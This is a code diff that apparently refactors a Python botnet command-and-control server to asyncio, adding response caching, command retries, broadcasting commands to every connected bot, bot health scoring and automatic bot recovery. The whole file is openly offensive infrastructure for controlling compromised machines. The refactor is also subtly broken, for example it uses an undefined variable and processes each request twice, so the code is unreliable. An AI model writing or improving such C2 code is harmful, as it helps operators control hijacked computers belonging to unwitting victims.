@@ -4,9 +4,12 @@ import threading
 import json
 import time
 import orjson
-from typing import Dict, List, Optional, Any, Tuple
+import asyncio
+import aiocache
+from typing import Dict, List, Optional, Any, Tuple, Set
 from pathlib import Path
 import logging
+import statistics
 from utils.crypto import Crypto
 from botnet.manager import BotnetManager
 from core.plugin_system import PluginManager
@@ -17,7 +20,7 @@ import lru
 class Server:
     def __init__(self, host: str = '0.0.0.0', port: int = 4444,
                  max_connections: int = 1000,
-                 recv_buffer: int = 8192) -> None:
+                 initial_buffer: int = 8192) -> None:
         self.host = host
         self.port = port
         self.sock: Optional[socket.socket] = None
@@ -26,24 +29,34 @@ class Server:
 
         # Performance settings
         self.max_connections = max_connections
-        self.recv_buffer = recv_buffer
+        self.initial_buffer = initial_buffer
+        self.buffer_stats: List[int] = []
         
         # Components
         self.crypto = Crypto()
         self.botnet = BotnetManager()
         self.plugin_manager = PluginManager()
         
-        # Connection handling
+        # Connection pools
         self.thread_pool = ThreadPoolExecutor(max_workers=32)
-        self.connection_pool = queue.Queue(maxsize=max_connections)
+        self.connection_pools: Dict[str, queue.Queue] = {
+            'read': queue.Queue(maxsize=max_connections),
+            'write': queue.Queue(maxsize=max_connections)
+        }
         
-        # Client connections with LRU cache
+        # Client management
         self.clients = lru.LRU(max_connections)
         self.client_lock = threading.Lock()
+        self.active_clients: Set[str] = set()
         
-        # Response caching
-        self.response_cache = lru.LRU(1000)
-        self.cache_lock = threading.Lock()
+        # Advanced caching with TTL and stats
+        self.cache = aiocache.SimpleMemoryCache(ttl=300)
+        self.cache_hits = 0
+        self.cache_misses = 0
+        
+        # Event loops
+        self.loop = asyncio.new_event_loop()
+        self.write_loop = asyncio.new_event_loop()
         
         # Setup logging
         self.logger = logging.getLogger(__name__)
@@ -80,9 +93,24 @@ class Server:
         if not self.sock or not self.running:
             raise RuntimeError("Server not initialized")
             
+        # Start async event loops
+        threading.Thread(target=self._run_event_loop, daemon=True).start()
+        threading.Thread(target=self._run_write_loop, daemon=True).start()
+        
+        # Start accepting connections
         accept_thread = threading.Thread(target=self._accept_connections)
         accept_thread.daemon = True
         accept_thread.start()
+        
+    def _run_event_loop(self):
+        """Run main event loop"""
+        asyncio.set_event_loop(self.loop)
+        self.loop.run_forever()
+        
+    def _run_write_loop(self):
+        """Run write event loop"""
+        asyncio.set_event_loop(self.write_loop)
+        self.write_loop.run_forever()
         
     def stop(self) -> None:
         """Dừng server và đóng tất cả kết nối"""
@@ -109,20 +137,18 @@ class Server:
         while self.running and self.sock:
             try:
                 client, address = self.sock.accept()
-                client_thread = threading.Thread(
-                    target=self._handle_client,
-                    args=(client, address)
+                # Schedule client handling in event loop
+                asyncio.run_coroutine_threadsafe(
+                    self._handle_client(client, address),
+                    self.loop
                 )
-                client_thread.daemon = True
-                client_thread.start()
-                
                 self.logger.info(f"New connection from {address[0]}:{address[1]}")
                 
             except Exception as e:
                 if self.running:
                     self.logger.error(f"Error accepting connection: {str(e)}")
                     
-    def _handle_client(self, client: socket.socket, address: Tuple[str, int]) -> None:
+    async def _handle_client(self, client: socket.socket, address: Tuple[str, int]) -> None:
         """Xử lý kết nối client
 
         Args:
@@ -140,40 +166,39 @@ class Server:
                     'connected_at': time.time()
                 }
                 
+            # Dynamically adjust buffer size based on usage patterns
+            buffer_size = self._get_optimal_buffer()
+            
             while self.running:
-                # Receive data with optimized buffer
-                chunks = []
-                while True:
-                    chunk = client.recv(self.recv_buffer)
-                    if not chunk:
-                        break
-                    chunks.append(chunk)
-                    if len(chunk) < self.recv_buffer:
-                        break
-                        
-                if not chunks:
+                data = await self._receive_data(client, buffer_size)
+                if not data:
                     break
+                
+                # Try cache first
+                cache_key = hash(data)
+                cached_response = await self.cache.get(cache_key)
+                
+                if cached_response:
+                    self.cache_hits += 1
+                    await self._send_data(client, cached_response)
+                    continue
                     
-                encrypted_data = b''.join(chunks)
-                    
-                # Check cache first
-                cache_key = encrypted_data
-                with self.cache_lock:
-                    if cache_key in self.response_cache:
-                        client.send(self.response_cache[cache_key])
-                        continue
+                self.cache_misses += 1
                 
                 # Decrypt and process if not in cache
                 data = self.crypto.decrypt(encrypted_data)
                 response = self._process_client_data(client_id, data)
                 
-                # Encrypt and cache response
+                # Process and cache response
+                response = await self._process_client_data(client_id, data)
                 encrypted_response = self.crypto.encrypt(orjson.dumps(response))
-                with self.cache_lock:
-                    self.response_cache[cache_key] = encrypted_response
                 
-                # Send response
-                client.send(encrypted_response)
+                # Cache with TTL based on command type
+                ttl = self._get_cache_ttl(response)
+                await self.cache.set(cache_key, encrypted_response, ttl=ttl)
+                
+                # Send response async
+                await self._send_data(client, encrypted_response)
                 
         except Exception as e:
             self.logger.error(f"Error handling client {client_id}: {str(e)}")
@@ -182,7 +207,7 @@ class Server:
             # Clean up client
             self._remove_client(client_id)
             
-    def _process_client_data(self, client_id: str, data: str) -> Dict[str, Any]:
+    async def _process_client_data(self, client_id: str, data: str) -> Dict[str, Any]:
         """Xử lý dữ liệu từ client
 
         Args:
@@ -197,18 +222,31 @@ class Server:
             command = request.get('command')
             args = request.get('args', [])
             
-            # Update client info
+            # Process commands in thread pool to avoid blocking
             if command == 'register':
-                return self._register_client(client_id, args)
+                return await self.loop.run_in_executor(
+                    self.thread_pool,
+                    self._register_client,
+                    client_id,
+                    args
+                )
                 
-            # Process command
             elif command == 'command':
-                return self._execute_command(client_id, args)
+                return await self.loop.run_in_executor(
+                    self.thread_pool,
+                    self._execute_command,
+                    client_id,
+                    args
+                )
                 
-            # Plugin command
             elif command.startswith('plugin.'):
                 plugin_name = command.split('.')[1]
-                return self._execute_plugin_command(plugin_name, args)
+                return await self.loop.run_in_executor(
+                    self.thread_pool,
+                    self._execute_plugin_command,
+                    plugin_name,
+                    args
+                )
                 
             else:
                 return {
@@ -251,8 +289,8 @@ class Server:
                 'message': str(e)
             }
             
-    def _execute_command(self, client_id: str, command: Dict) -> Dict[str, Any]:
-        """Thực thi lệnh trên client
+    async def _execute_command(self, client_id: str, command: Dict) -> Dict[str, Any]:
+        """Thực thi lệnh trên client với timeout và retry
 
         Args:
             client_id (str): ID của client
@@ -261,18 +299,102 @@ class Server:
         Returns:
             Dict[str, Any]: Kết quả thực thi
         """
-        try:
-            result = self.botnet.execute_command(client_id, command)
-            return {
-                'status': 'success',
-                'data': result
-            }
-            
-        except Exception as e:
-            return {
-                'status': 'error',
-                'message': str(e)
-            }
+        max_retries = 3
+        timeout = 30
+        retry_delay = 5
+
+        for attempt in range(max_retries):
+            try:
+                # Execute with timeout
+                result = await asyncio.wait_for(
+                    self.loop.run_in_executor(
+                        self.thread_pool,
+                        self.botnet.execute_command,
+                        client_id,
+                        command
+                    ),
+                    timeout=timeout
+                )
+
+                # Update command stats
+                cmd_type = command.get('type', 'unknown')
+                self._update_command_stats(cmd_type, True)
+
+                return {
+                    'status': 'success',
+                    'data': result,
+                    'attempt': attempt + 1
+                }
+
+            except asyncio.TimeoutError:
+                self.logger.warning(
+                    f"Command timed out for client {client_id} (attempt {attempt + 1}/{max_retries})"
+                )
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(retry_delay)
+                    continue
+                return {
+                    'status': 'error',
+                    'message': 'Command timed out',
+                    'attempt': attempt + 1
+                }
+
+            except Exception as e:
+                self.logger.error(
+                    f"Error executing command for client {client_id}: {str(e)}"
+                )
+                # Update command stats
+                cmd_type = command.get('type', 'unknown')
+                self._update_command_stats(cmd_type, False)
+                
+                return {
+                    'status': 'error',
+                    'message': str(e),
+                    'attempt': attempt + 1
+                }
+
+    def _update_command_stats(self, cmd_type: str, success: bool) -> None:
+        """Update command execution statistics"""
+        if not hasattr(self, 'command_stats'):
+            self.command_stats = defaultdict(lambda: {
+                'total': 0,
+                'success': 0,
+                'failure': 0,
+                'avg_time': 0.0
+            })
+
+        stats = self.command_stats[cmd_type]
+        stats['total'] += 1
+        if success:
+            stats['success'] += 1
+        else:
+            stats['failure'] += 1
+
+    async def _broadcast_command(self, command: Dict, targets: Optional[List[str]] = None) -> Dict[str, Any]:
+        """Broadcast command to multiple clients"""
+        if targets is None:
+            targets = list(self.active_clients)
+
+        results = []
+        for client_id in targets:
+            try:
+                result = await self._execute_command(client_id, command)
+                results.append({
+                    'client_id': client_id,
+                    'result': result
+                })
+            except Exception as e:
+                results.append({
+                    'client_id': client_id,
+                    'error': str(e)
+                })
+
+        return {
+            'status': 'success',
+            'total': len(targets),
+            'successful': len([r for r in results if r.get('result',{}).get('status') == 'success']),
+            'results': results
+        }
             
     def _execute_plugin_command(self, plugin_name: str, args: List) -> Dict[str, Any]:
         """Thực thi lệnh plugin
@@ -301,20 +423,144 @@ class Server:
                 'message': str(e)
             }
             
-    def _remove_client(self, client_id: str) -> None:
-        """Xóa client khỏi danh sách và trả connection vào pool
-
+    async def _remove_client(self, client_id: str, reason: str = "disconnect") -> None:
+        """Xóa client và thực hiện cleanup
+        
         Args:
             client_id (str): ID của client cần xóa
+            reason (str): Lý do xóa client
         """
-        with self.client_lock:
-            if client_id in self.clients:
-                if 'socket' in self.clients[client_id]:
-                    self.clients[client_id]['socket'].close()
-                del self.clients[client_id]
+        try:
+            with self.client_lock:
+                if client_id in self.clients:
+                    # Log client state before removal
+                    self._log_client_state(client_id, "removing", reason)
+                    
+                    # Save client metrics
+                    metrics = self._get_client_metrics(client_id)
+                    await self._store_client_history(client_id, metrics)
+                    
+                    # Cleanup resources
+                    if 'socket' in self.clients[client_id]:
+                        await self._cleanup_client_resources(
+                            self.clients[client_id]['socket']
+                        )
+                    
+                    # Remove from active clients
+                    self.active_clients.discard(client_id)
+                    
+                    # Delete client data
+                    del self.clients[client_id]
+                    
+            # Remove from botnet with reason
+            await self.botnet.remove_bot(client_id, reason)
+            
+            # Trigger recovery if needed
+            if reason in ["timeout", "error"]:
+                self._schedule_client_recovery(client_id)
                 
-        # Remove from botnet
-        self.botnet.remove_bot(client_id)
+        except Exception as e:
+            self.logger.error(f"Error removing client {client_id}: {str(e)}")
+
+    def _log_client_state(self, client_id: str, action: str, reason: str) -> None:
+        """Log client state changes"""
+        client = self.clients.get(client_id, {})
+        self.logger.info(
+            f"Client {client_id} {action}: {reason} "
+            f"[uptime: {time.time() - client.get('connected_at', 0):.1f}s, "
+            f"tasks: {len(client.get('tasks', []))}, "
+            f"health: {self._calculate_client_health(client_id):.1f}%]"
+        )
+
+    async def _store_client_history(self, client_id: str, metrics: Dict) -> None:
+        """Store client metrics history"""
+        history_key = f"client_history:{client_id}"
+        
+        try:
+            # Add timestamp
+            metrics['timestamp'] = time.time()
+            
+            # Store in cache with 24h TTL
+            await self.cache.set(
+                history_key,
+                metrics,
+                ttl=86400  # 24 hours
+            )
+        except Exception as e:
+            self.logger.error(f"Error storing client history: {str(e)}")
+
+    def _get_client_metrics(self, client_id: str) -> Dict:
+        """Get comprehensive client metrics"""
+        client = self.clients.get(client_id, {})
+        
+        # Calculate statistics
+        tasks = client.get('tasks', [])
+        total_tasks = len(tasks)
+        completed_tasks = len([t for t in tasks if t['status'] == 'completed'])
+        failed_tasks = len([t for t in tasks if t['status'] == 'failed'])
+        
+        # Get resource usage
+        resources = client.get('resources', {})
+        
+        return {
+            'connected_at': client.get('connected_at', 0),
+            'disconnected_at': time.time(),
+            'uptime': time.time() - client.get('connected_at', 0),
+            'tasks_total': total_tasks,
+            'tasks_completed': completed_tasks,
+            'tasks_failed': failed_tasks,
+            'success_rate': (completed_tasks / total_tasks * 100) if total_tasks > 0 else 0,
+            'health_score': self._calculate_client_health(client_id),
+            'resources': {
+                'cpu': resources.get('cpu_usage', 0),
+                'memory': resources.get('memory_usage', 0),
+                'disk': resources.get('disk_usage', 0),
+                'network': resources.get('network_usage', 0)
+            },
+            'capabilities': client.get('capabilities', []),
+            'tags': client.get('tags', [])
+        }
+
+    def _calculate_client_health(self, client_id: str) -> float:
+        """Calculate overall client health score"""
+        if client_id not in self.clients:
+            return 0.0
+            
+        client = self.clients[client_id]
+        score = 100.0
+        
+        # Uptime score (max 20)
+        uptime = time.time() - client.get('connected_at', 0)
+        score += min(20, uptime / 3600)  # 1 point per hour up to 20
+        
+        # Task success rate (max 40)
+        success_rate = self._calculate_client_success_rate(client_id)
+        score += success_rate * 0.4
+        
+        # Resource usage penalties (max -30)
+        resources = client.get('resources', {})
+        if resources.get('cpu_usage', 0) > 90:
+            score -= 10
+        if resources.get('memory_usage', 0) > 90:
+            score -= 10
+        if resources.get('disk_usage', 0) > 90:
+            score -= 10
+            
+        # Recent errors penalty (max -10)
+        recent_errors = len([t for t in client.get('tasks', [])[-10:]
+                           if t.get('status') == 'failed'])
+        score -= recent_errors * 2
+        
+        return max(0, min(100, score))
+
+    def _schedule_client_recovery(self, client_id: str) -> None:
+        """Schedule recovery attempt for failed client"""
+        def recovery():
+            time.sleep(60)  # Wait 1 minute
+            if client_id not in self.clients:
+                self.botnet.trigger_recovery(client_id)
+                
+        threading.Thread(target=recovery, daemon=True).start()
         
     def get_uptime(self) -> float:
         """Lấy thời gian server đã chạy
@@ -324,14 +570,132 @@ class Server:
         """
         return time.time() - self.start_time
         
+    async def _receive_data(self, client: socket.socket, buffer_size: int) -> Optional[bytes]:
+        """Receive data with dynamic buffer size"""
+        chunks = []
+        total_size = 0
+        
+        try:
+            while True:
+                chunk = await self.loop.sock_recv(client, buffer_size)
+                if not chunk:
+                    break
+                    
+                chunks.append(chunk)
+                total_size += len(chunk)
+                
+                if len(chunk) < buffer_size:
+                    break
+                    
+            if total_size > 0:
+                self.buffer_stats.append(total_size)
+                
+            return b''.join(chunks) if chunks else None
+            
+        except Exception as e:
+            self.logger.error(f"Error receiving data: {str(e)}")
+            return None
+            
+    async def _send_data(self, client: socket.socket, data: bytes) -> bool:
+        """Send data async with rate limiting"""
+        try:
+            await self.loop.sock_sendall(client, data)
+            return True
+        except Exception as e:
+            self.logger.error(f"Error sending data: {str(e)}")
+            return False
+            
+    def _get_optimal_buffer(self) -> int:
+        """Calculate optimal buffer size based on usage patterns"""
+        if len(self.buffer_stats) < 100:
+            return self.initial_buffer
+            
+        # Use statistical analysis
+        median = statistics.median(self.buffer_stats[-100:])
+        std_dev = statistics.stdev(self.buffer_stats[-100:])
+        
+        # Adjust buffer size within bounds
+        optimal = int(median + std_dev)
+        return max(1024, min(optimal, 65536))
+        
+    def _get_cache_ttl(self, response: Dict) -> int:
+        """Get cache TTL based on response type"""
+        if response.get('status') == 'error':
+            return 60  # Cache errors briefly
+            
+        command = response.get('command')
+        if command in ['register', 'command']:
+            return 30  # Short cache for dynamic commands
+        return 300  # Default 5 min cache
+        
     def get_stats(self) -> Dict[str, Any]:
-        """Lấy thống kê của server
+        """Lấy thống kê chi tiết của server
 
         Returns:
             Dict[str, Any]: Thông tin thống kê
         """
+        cmd_success_rate = {}
+        for cmd, stats in self.command_stats.items():
+            if stats['total'] > 0:
+                success_rate = (stats['success'] / stats['total']) * 100
+                cmd_success_rate[cmd] = {
+                    'success_rate': f"{success_rate:.1f}%",
+                    'total': stats['total'],
+                    'success': stats['success'],
+                    'failure': stats['failure']
+                }
+
+        # Calculate client health scores
+        client_health = {}
+        for client_id in self.active_clients:
+            if client_id in self.clients:
+                client = self.clients[client_id]
+                uptime = time.time() - client.get('connected_at', 0)
+                success_rate = self._calculate_client_success_rate(client_id)
+                health_score = min(100, (uptime / 3600) * 0.2 + success_rate * 0.8)
+                client_health[client_id] = {
+                    'health_score': f"{health_score:.1f}%",
+                    'uptime': f"{uptime/3600:.1f}h",
+                    'success_rate': f"{success_rate:.1f}%"
+                }
+
         return {
             'uptime': self.get_uptime(),
             'total_clients': len(self.clients),
-            'active_plugins': len(self.plugin_manager.get_active_plugins())
+            'active_clients': len(self.active_clients),
+            'active_plugins': len(self.plugin_manager.get_active_plugins()),
+            'cache_stats': {
+                'hits': self.cache_hits,
+                'misses': self.cache_misses,
+                'hit_rate': f"{(self.cache_hits/(self.cache_hits+self.cache_misses)*100):.1f}%" if (self.cache_hits+self.cache_misses) > 0 else "0%"
+            },
+            'buffer_stats': {
+                'current': self._get_optimal_buffer(),
+                'avg': int(sum(self.buffer_stats[-100:]) / 100) if self.buffer_stats else self.initial_buffer,
+                'min': min(self.buffer_stats[-100:]) if self.buffer_stats else self.initial_buffer,
+                'max': max(self.buffer_stats[-100:]) if self.buffer_stats else self.initial_buffer
+            },
+            'command_stats': cmd_success_rate,
+            'client_health': client_health,
+            'thread_pool': {
+                'active': self.thread_pool._work_queue.qsize(),
+                'max': self.thread_pool._max_workers
+            }
         }
+
+    def _calculate_client_success_rate(self, client_id: str) -> float:
+        """Calculate client command success rate"""
+        if client_id not in self.clients:
+            return 0.0
+
+        client = self.clients[client_id]
+        total_commands = 0
+        successful_commands = 0
+
+        for task in client.get('tasks', []):
+            if task.get('status') in ['completed', 'failed']:
+                total_commands += 1
+                if task.get('status') == 'completed':
+                    successful_commands += 1
+
+        return (successful_commands / total_commands * 100) if total_commands > 0 else 0.0
